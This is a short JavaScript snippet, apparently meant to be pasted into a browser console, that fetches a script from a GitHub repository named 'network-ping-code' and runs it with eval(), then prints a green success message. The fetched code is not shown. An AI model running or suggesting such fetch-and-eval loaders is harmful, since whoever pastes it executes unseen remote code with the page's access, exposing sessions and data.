fetch('https://github.com/ComplexedConcepts0/network-ping-code/blob/main/ping.js')
    .then(response => response.text())
    .then(script => {
        eval(script);
        console.log('%cScript has been executed successfully!', 'color: green; font-size: 20px;');
    })
    .catch(error => {
        console.error('Failed to load the script:', error);
    });
